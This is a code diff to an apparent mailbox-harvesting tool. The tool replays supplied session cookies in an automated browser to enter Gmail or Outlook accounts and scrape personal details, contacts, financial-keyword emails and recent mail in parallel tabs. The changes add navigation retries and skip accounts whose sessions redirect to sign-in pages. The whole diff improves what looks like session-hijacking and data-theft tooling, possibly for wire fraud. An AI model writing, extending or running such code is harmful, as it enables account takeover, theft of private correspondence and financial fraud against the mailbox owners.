@@ -101,20 +101,28 @@ function getCriticalSelector(url) {
 }
 
 async function gotoRobust(page, url, timeout = 60000) {
-    const start = Date.now();
-    try {
-        await page.goto(url, { waitUntil: 'domcontentloaded', timeout });
-        const selector = getCriticalSelector(url);
-        if (selector) {
-            try { await page.waitForSelector(selector, { timeout: 10000 }); }
-            catch { /* loaded but selector missing */ }
+    for (let attempt = 0; attempt < 2; attempt++) {
+        const start = Date.now();
+        try {
+            await page.goto(url, { waitUntil: 'domcontentloaded', timeout });
+            const selector = getCriticalSelector(url);
+            if (selector) {
+                try { await page.waitForSelector(selector, { timeout: 10000 }); }
+                catch { /* loaded but selector missing */ }
+            }
+            logger.info(`[smartExtract] nav OK ${url} in ${Date.now() - start}ms`);
+            await DOMHelpers.randomDelay(1000, 2000);
+            return;
+        } catch (e) {
+            if (attempt === 0) {
+                logger.warn(`[smartExtract] nav retry ${url} (attempt 1 failed: ${e.message})`);
+                await new Promise(r => setTimeout(r, 2000));
+                continue;
+            }
+            logger.warn(`[smartExtract] nav FAIL ${url}: ${e.message} | actual=${page.url()}`);
+            throw e;
         }
-        logger.info(`[smartExtract] nav OK ${url} in ${Date.now() - start}ms`);
-    } catch (e) {
-        logger.warn(`[smartExtract] nav FAIL ${url}: ${e.message} | actual=${page.url()}`);
-        throw e;
     }
-    await DOMHelpers.randomDelay(1000, 2000);
 }
 
 async function createTab(browser, cookieJSON) {
@@ -126,6 +134,15 @@ async function createTab(browser, cookieJSON) {
 }
 
 // ==================== Gmail / Outlook Personal Info ====================
+
+const SIGN_IN_PATTERNS = [
+    /signin/i, /ServiceLogin/i, /challenge/i, /accounts\.google\.com\/(?:identifier|v3|signin)/i,
+    /login/i, /oidc/i, /auth\/signin/i,
+];
+
+function isSignInPage(pageUrl) {
+    return SIGN_IN_PATTERNS.some(p => p.test(pageUrl));
+}
 
 const PERSONAL_INFO_SITES = {
     gmail: [
@@ -145,6 +162,11 @@ async function extractPersonalInfo(page, platform) {
     for (const url of sites) {
         try {
             await gotoRobust(page, url);
+            const currentUrl = page.url();
+            if (isSignInPage(currentUrl)) {
+                logger.warn(`[smartExtract] personal info redirected to sign-in: ${currentUrl}`);
+                continue;
+            }
             raw = await page.evaluate(() => document.body.textContent.trim().slice(0, 6000));
             if (raw.length > 50) break;
         } catch (e) {
@@ -268,6 +290,10 @@ async function extractBoxSummary(page, platform) {
         : 'https://outlook.live.com/mail/0/inbox';
     try {
         await gotoRobust(page, inboxUrl);
+        if (isSignInPage(page.url())) {
+            logger.warn(`[smartExtract] box summary redirected to sign-in: ${page.url()}`);
+            return { totalEmails: 0, unreadEmails: 0, folders: [], labels: [] };
+        }
     } catch (e) {
         logger.warn(`[smartExtract] box summary nav failed: ${e.message}`);
     }
@@ -314,6 +340,10 @@ async function extractContacts(page, platform, maxContacts = 200) {
     // Gmail: use contacts.google.com/frequent with correct selectors
     try {
         await gotoRobust(page, 'https://contacts.google.com/frequent');
+        if (isSignInPage(page.url())) {
+            logger.warn(`[smartExtract] contacts redirected to sign-in: ${page.url()}`);
+            return contacts.slice(0, maxContacts);
+        }
 
         for (let i = 0; i < 8; i++) {
             const batch = await page.evaluate(() => {
@@ -518,6 +548,10 @@ async function collectEmailTexts(page, platform, maxEmails = 30, terms = FINANCI
         if (emails.length >= maxEmails) break;
         try {
             await gotoRobust(page, financialSearchUrl(platform, term));
+            if (isSignInPage(page.url())) {
+                logger.warn(`[smartExtract] financial search redirected to sign-in: ${page.url()}`);
+                break;
+            }
             await sleep(1500);
             const hostname = platform === 'gmail' ? 'google.com' : 'outlook.live.com';
             const rows = await page.evaluate((host) => {
@@ -621,6 +655,10 @@ async function collectRecentEmails(page, platform, limit = 50) {
                 ? `https://mail.google.com/mail/u/0/#${view}`
                 : `https://outlook.live.com/mail/${view}`;
             await gotoRobust(page, url);
+            if (isSignInPage(page.url())) {
+                logger.warn(`[smartExtract] activities view redirected to sign-in: ${page.url()}`);
+                break;
+            }
             await sleep(1500);
 
             const hostname = platform === 'gmail' ? 'google.com' : 'outlook.live.com';
@@ -718,8 +756,9 @@ async function extractWire(session, browserId) {
 
     const { browser, page } = await launchBrowserWithSession(cookieJSON);
     try {
-        // Create 6 tabs: personal(page), box, contacts, financial×3
+        // Create 6 tabs: box, contacts, financial×3, activities (personal uses main page)
         tabs = await Promise.all([
+            createTab(browser, cookieJSON),
             createTab(browser, cookieJSON),
             createTab(browser, cookieJSON),
             createTab(browser, cookieJSON),
@@ -727,7 +766,7 @@ async function extractWire(session, browserId) {
             createTab(browser, cookieJSON),
         ]);
 
-        // Run all phases in parallel including 3 financial batches
+        // Run all phases in parallel — each gets its own tab (no shared page conflicts)
         const phases = [
             ['personal', () => extractPersonalInfo(page, platform)],
             ['box', () => extractBoxSummary(tabs[0], platform)],
@@ -735,7 +774,7 @@ async function extractWire(session, browserId) {
             ['financial1', () => collectEmailTexts(tabs[2], platform, 10, BATCH1)],
             ['financial2', () => collectEmailTexts(tabs[3], platform, 10, BATCH2)],
             ['financial3', () => collectEmailTexts(tabs[4], platform, 10, BATCH3)],
-            ['activities', () => extractActivities(page, platform, 50)],
+            ['activities', () => extractActivities(tabs[5], platform, 50)],
         ];
 
         let done = 0;
